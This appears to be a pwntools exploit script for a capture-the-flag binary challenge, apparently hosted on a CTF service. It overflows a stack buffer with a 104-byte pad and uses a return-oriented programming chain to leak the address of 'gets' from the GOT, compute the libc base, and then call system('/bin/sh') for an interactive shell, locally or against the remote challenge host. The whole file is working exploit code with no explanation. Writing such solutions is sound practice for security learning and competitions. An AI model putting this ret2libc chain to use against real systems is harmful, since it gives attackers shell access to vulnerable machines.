from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

if args.REMOTE:
   HOST = '0.cloud.chals.io' 
   PORT=28794
   libc = ELF('libc.so.6-4')
else:
   libc = e.libc

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST,PORT)
    else:
        return process(e.path)

ret = p64(r.find_gadget(['ret'])[0])

p = start()

chain = cyclic(104)
chain += p64(e.got['gets'])*1
chain += ret
chain += p64(e.sym['main'])

p.sendline(chain)
leak=int.from_bytes(p.recvline().strip(b'\n'),byteorder='little')
log.info(f"Leak: {hex(leak)}")
libc.address=leak-libc.sym['gets']
log.info(f"Libc: {hex(libc.address)}")

rl = ROP(libc)
ret = p64(rl.find_gadget(['ret'])[0])
pop_rdi = p64(rl.find_gadget(['pop rdi','ret'])[0])
sh = p64(next(libc.search(b'/bin/sh')))

log.info("Pass 2")

chain = cyclic(104)
chain += p64(e.got['gets'])*1
chain += ret
chain += pop_rdi
chain += sh
chain += p64(libc.sym.system)

p.sendline(chain)

p.interactive()
